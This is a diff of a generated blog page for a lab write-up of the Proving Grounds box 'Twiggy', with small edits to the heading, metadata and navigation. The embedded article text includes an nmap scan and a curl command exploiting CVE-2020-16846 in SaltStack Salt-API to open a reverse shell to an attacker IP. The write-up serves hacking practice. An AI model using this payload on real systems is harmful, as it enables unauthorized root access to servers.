@@ -39,10 +39,7 @@ PORT     STATE SERVICE VERSION
 4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
 4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
 8000/tcp open  http    nginx 1.16.1
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 117.61 seconds
-Proof
+Proof.txt
 As we can see in the port scan above, there are two web servers running on the target. On port 80 there is a Mezzanine Instance which doesn&rsquo;t seem to be exploitable. On the other hand, the webserver on Port 8000 is running a Saltstack-Salt-API as can be seen in the X-Upstream Header in the HTTP-Response:">
 <meta name="author" content="Fabio Birnegger">
 <link rel="canonical" href="http://localhost:1313/writeups/pg_twiggy/">
@@ -74,7 +71,7 @@ As we can see in the port scan above, there are two web servers running on the t
   <meta property="og:title" content="PG Practice - Twiggy">
   <meta property="og:description" content="Box Details
 Difficulty Easy Type Linux Port Scan
-└─$ nmap -sV -p- 192.168.208.62Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 20:40 &#43;0200Nmap scan report for 192.168.208.62Host is up (0.032s latency).Not shown: 65529 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)53/tcp open domain NLnet Labs NSD80/tcp open http nginx 1.16.14505/tcp open zmtp ZeroMQ ZMTP 2.04506/tcp open zmtp ZeroMQ ZMTP 2.08000/tcp open http nginx 1.16.1Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 117.61 seconds Proof As we can see in the port scan above, there are two web servers running on the target. On port 80 there is a Mezzanine Instance which doesn’t seem to be exploitable. On the other hand, the webserver on Port 8000 is running a Saltstack-Salt-API as can be seen in the X-Upstream Header in the HTTP-Response:">
+└─$ nmap -sV -p- 192.168.208.62Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 20:40 &#43;0200Nmap scan report for 192.168.208.62Host is up (0.032s latency).Not shown: 65529 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)53/tcp open domain NLnet Labs NSD80/tcp open http nginx 1.16.14505/tcp open zmtp ZeroMQ ZMTP 2.04506/tcp open zmtp ZeroMQ ZMTP 2.08000/tcp open http nginx 1.16.1 Proof.txt As we can see in the port scan above, there are two web servers running on the target. On port 80 there is a Mezzanine Instance which doesn’t seem to be exploitable. On the other hand, the webserver on Port 8000 is running a Saltstack-Salt-API as can be seen in the X-Upstream Header in the HTTP-Response:">
   <meta property="og:locale" content="en-us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
@@ -119,10 +116,7 @@ PORT     STATE SERVICE VERSION
 4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
 4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
 8000/tcp open  http    nginx 1.16.1
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 117.61 seconds
-Proof
+Proof.txt
 As we can see in the port scan above, there are two web servers running on the target. On port 80 there is a Mezzanine Instance which doesn&rsquo;t seem to be exploitable. On the other hand, the webserver on Port 8000 is running a Saltstack-Salt-API as can be seen in the X-Upstream Header in the HTTP-Response:">
 
 
@@ -152,12 +146,12 @@ As we can see in the port scan above, there are two web servers running on the t
   "@type": "BlogPosting",
   "headline": "PG Practice - Twiggy",
   "name": "PG Practice - Twiggy",
-  "description": "Box Details\nDifficulty Easy Type Linux Port Scan\n└─$ nmap -sV -p- 192.168.208.62\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 20:40 +0200\rNmap scan report for 192.168.208.62\rHost is up (0.032s latency).\rNot shown: 65529 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.4 (protocol 2.0)\r53/tcp open domain NLnet Labs NSD\r80/tcp open http nginx 1.16.1\r4505/tcp open zmtp ZeroMQ ZMTP 2.0\r4506/tcp open zmtp ZeroMQ ZMTP 2.0\r8000/tcp open http nginx 1.16.1\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 117.61 seconds Proof As we can see in the port scan above, there are two web servers running on the target. On port 80 there is a Mezzanine Instance which doesn\u0026rsquo;t seem to be exploitable. On the other hand, the webserver on Port 8000 is running a Saltstack-Salt-API as can be seen in the X-Upstream Header in the HTTP-Response:\n",
+  "description": "Box Details\nDifficulty Easy Type Linux Port Scan\n└─$ nmap -sV -p- 192.168.208.62\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 20:40 +0200\rNmap scan report for 192.168.208.62\rHost is up (0.032s latency).\rNot shown: 65529 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.4 (protocol 2.0)\r53/tcp open domain NLnet Labs NSD\r80/tcp open http nginx 1.16.1\r4505/tcp open zmtp ZeroMQ ZMTP 2.0\r4506/tcp open zmtp ZeroMQ ZMTP 2.0\r8000/tcp open http nginx 1.16.1 Proof.txt As we can see in the port scan above, there are two web servers running on the target. On port 80 there is a Mezzanine Instance which doesn\u0026rsquo;t seem to be exploitable. On the other hand, the webserver on Port 8000 is running a Saltstack-Salt-API as can be seen in the X-Upstream Header in the HTTP-Response:\n",
   "keywords": [
     "Proving Grounds Practice", "Linux", "Write-Up"
   ],
-  "articleBody": "Box Details\nDifficulty Easy Type Linux Port Scan\n└─$ nmap -sV -p- 192.168.208.62\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 20:40 +0200\rNmap scan report for 192.168.208.62\rHost is up (0.032s latency).\rNot shown: 65529 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.4 (protocol 2.0)\r53/tcp open domain NLnet Labs NSD\r80/tcp open http nginx 1.16.1\r4505/tcp open zmtp ZeroMQ ZMTP 2.0\r4506/tcp open zmtp ZeroMQ ZMTP 2.0\r8000/tcp open http nginx 1.16.1\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 117.61 seconds Proof As we can see in the port scan above, there are two web servers running on the target. On port 80 there is a Mezzanine Instance which doesn’t seem to be exploitable. On the other hand, the webserver on Port 8000 is running a Saltstack-Salt-API as can be seen in the X-Upstream Header in the HTTP-Response:\nThe service is vulnerable to CVE-2020-16846 which allows us to execute arbitrary commands on the target server. There is a public exploit available which i modified to the following command:\ncurl -i 192.168.208.62:8000/run -H \"Content-type: application/json\" -d '{\"client\":\"ssh\",\"tgt\":\"A\",\"fun\":\"B\",\"eauth\":\"C\",\"ssh_priv\":\"|/bin/sh -i \u003e\u0026 /dev/tcp/192.168.45.155/80 0\u003e\u00261 #\"}' I then started a netcat listener on port 80 on my attacker machine and ran the command. Shortly after i received a root shell and was able to read the flag /root/proof.txt on the target machine:\n",
-  "wordCount" : "238",
+  "articleBody": "Box Details\nDifficulty Easy Type Linux Port Scan\n└─$ nmap -sV -p- 192.168.208.62\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 20:40 +0200\rNmap scan report for 192.168.208.62\rHost is up (0.032s latency).\rNot shown: 65529 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.4 (protocol 2.0)\r53/tcp open domain NLnet Labs NSD\r80/tcp open http nginx 1.16.1\r4505/tcp open zmtp ZeroMQ ZMTP 2.0\r4506/tcp open zmtp ZeroMQ ZMTP 2.0\r8000/tcp open http nginx 1.16.1 Proof.txt As we can see in the port scan above, there are two web servers running on the target. On port 80 there is a Mezzanine Instance which doesn’t seem to be exploitable. On the other hand, the webserver on Port 8000 is running a Saltstack-Salt-API as can be seen in the X-Upstream Header in the HTTP-Response:\nThe service is vulnerable to CVE-2020-16846 which allows us to execute arbitrary commands on the target server. There is a public exploit available which i modified to the following command:\ncurl -i 192.168.208.62:8000/run -H \"Content-type: application/json\" -d '{\"client\":\"ssh\",\"tgt\":\"A\",\"fun\":\"B\",\"eauth\":\"C\",\"ssh_priv\":\"|/bin/sh -i \u003e\u0026 /dev/tcp/192.168.45.155/80 0\u003e\u00261 #\"}' I then started a netcat listener on port 80 on my attacker machine and ran the command. Shortly after i received a root shell and was able to read the flag /root/proof.txt on the target machine:\n",
+  "wordCount" : "215",
   "inLanguage": "en",
   "image":"http://localhost:1313/writeups/pg_twiggy/images/writeup_screens/pg_twiggy/twiggy_cover.svg","datePublished": "2026-04-04T00:00:00Z",
   "dateModified": "2026-04-04T00:00:00Z",
@@ -240,7 +234,7 @@ As we can see in the port scan above, there are two web servers running on the t
 </div>
   </header> 
 <figure class="entry-cover">
-        <img loading="eager" src="http://localhost:1313/images/writeup_screens/pg_twiggy/twiggy_cover.svg" alt="HTB CCTV Cover">
+        <img loading="eager" src="http://localhost:1313/images/writeup_screens/pg_twiggy/twiggy_cover.svg" alt="PG Twiggy Cover">
         
 </figure>
   <div class="post-content"><p><strong>Box Details</strong></p>
@@ -275,10 +269,7 @@ PORT     STATE SERVICE VERSION
 4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
 4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
 8000/tcp open  http    nginx 1.16.1
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 117.61 seconds
-</code></pre><h2 id="proof">Proof<a hidden class="anchor" aria-hidden="true" href="#proof">#</a></h2>
+</code></pre><h2 id="prooftxt">Proof.txt<a hidden class="anchor" aria-hidden="true" href="#prooftxt">#</a></h2>
 <p>As we can see in the port scan above, there are two web servers running on the target. On port <strong>80</strong> there is a <em>Mezzanine</em> Instance which doesn&rsquo;t seem to be exploitable. On the other hand, the webserver on Port <strong>8000</strong> is running a <strong>Saltstack-Salt-API</strong> as can be seen in the <em>X-Upstream</em> Header in the HTTP-Response:</p>
 <p><img loading="lazy" src="/images/writeup_screens/pg_twiggy/pg_twiggy1.png"></p>
 <p>The service is vulnerable to <strong>CVE-2020-16846</strong> which allows us to execute arbitrary commands on the target server. There is a <a href="https://github.com/zomy22/CVE-2020-16846-Saltstack-Salt-API">public exploit</a> available which i modified to the following command:</p>
@@ -296,6 +287,11 @@ Nmap done: 1 IP address (1 host up) scanned in 117.61 seconds
       <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
     </ul>
 <nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/pg_pelican/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>PG Practice - Pelican</span>
+  </a>
   <a class="next" href="http://localhost:1313/writeups/htb_cap/">
     <span class="title">Next »</span>
     <br>
